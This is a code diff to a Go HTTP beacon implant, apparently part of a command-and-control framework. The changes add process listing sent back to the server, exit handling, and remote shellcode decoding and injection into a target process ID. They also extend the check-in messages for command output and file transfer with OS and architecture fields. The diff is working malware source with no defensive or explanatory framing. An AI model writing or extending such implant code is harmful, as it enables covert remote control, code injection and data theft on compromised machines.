@@ -5,6 +5,7 @@ import (
 	"io"
 	"fmt"
 	"bytes"
+	"strconv"
 	"os/exec"
 	"strings"
 	"runtime"
@@ -12,7 +13,16 @@ import (
 	"encoding/json"
     "mime/multipart"
 	b64 "encoding/base64"
+	ps "github.com/mitchellh/go-ps"
 )
+
+func (packet BeaconHttp) exitHandler() {
+	data, err := json.Marshal(CommandUpdate{ip,id,runtime.GOOS,runtime.GOARCH,"quit",[]byte("quit")})
+	debugFatal(err)
+	encoded := b64.StdEncoding.EncodeToString(data)
+	queryCommandHttp(encoded)
+	os.Exit(1)
+}
 
 func (packet BeaconHttp) queryServer() {
 	resp, err := queryCommandHttp(string(packet.data))
@@ -51,8 +61,28 @@ func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
 
 func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 	for _, cmd := range commResp.Exec {
-		//cmdSplit := strings.Fields(cmd);
+		cmdSplit := strings.Fields(cmd);
 		output := []byte{}
+		fmt.Println(cmdSplit[0] == "quit")
+		
+		if cmdSplit[0] == "exit" || cmdSplit[0] == "quit" {
+			packet.exitHandler()
+		}
+		fmt.Println(cmdSplit)
+		if cmdSplit[0] == "plist" {
+			procs := "------------------------------\nPID\tPPID\tName\n------------------------------"
+			procList, _ := ps.Processes()
+			
+			for _, p := range procList {
+				procs += "\n" + strconv.Itoa(p.Pid()) + "\t" + strconv.Itoa(p.PPid()) + "\t" + p.Executable()
+			}
+
+			data, err := json.Marshal(CommandUpdate{ip,id,runtime.GOOS,runtime.GOARCH,"plist",[]byte(procs)})
+			debugFatal(err)
+			encoded := b64.StdEncoding.EncodeToString(data)
+			queryCommandHttp(encoded)
+			return
+		}
 		
 		if runtime.GOOS == "linux" {
 			command := []string{ "-c", cmd }
@@ -63,11 +93,34 @@ func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 		}
 
 		if len(output) > 0 {
-			data, err := json.Marshal(CommandUpdate{ip,id,"exec",output})
+			data, err := json.Marshal(CommandUpdate{ip,id,runtime.GOOS,runtime.GOARCH,"exec",output})
 			debugFatal(err)
 			encoded := b64.StdEncoding.EncodeToString(data)
 			queryCommandHttp(encoded)
 		}
+	}
+
+	for i := 0; i < len(commResp.Shellcode); i += 2 {
+		shellcode := commResp.Shellcode[i]
+		procId, err := strconv.Atoi(commResp.Shellcode[i+1])
+		fmt.Println(procId)
+
+		if err != nil {
+			debugFatal(err)
+			continue
+		}
+		
+		decodedShellcode, err := b64.StdEncoding.DecodeString(shellcode)
+	
+		if err != nil {
+			debugFatal(err)
+			continue
+		}
+
+		si := ShellcodeInjector {decodedShellcode, procId}
+		go func() {
+			si.inject()
+		}()
 	}
 
 	for _, file := range commResp.Download {
@@ -129,7 +182,7 @@ func (packet BeaconHttp) download(filePath string) {
 
 	result += ";" + targetDir + "/" + filename
 
-	data, err := json.Marshal(CommandUpdate{ip,id,"upload", []byte(result)})
+	data, err := json.Marshal(CommandUpdate{ip,id,runtime.GOOS,runtime.GOARCH,"upload", []byte(result)})
 	debugFatal(err)
 	
 	if err != nil {
@@ -141,7 +194,7 @@ func (packet BeaconHttp) download(filePath string) {
 }
 
 func (packet BeaconHttp) upload(filename string) {
-	data, err := json.Marshal(CommandUpdate{ip,id,"upload", []byte(filename)})
+	data, err := json.Marshal(CommandUpdate{ip,id,runtime.GOOS,runtime.GOARCH,"upload", []byte(filename)})
 	debugFatal(err)
 	
 	if err != nil {
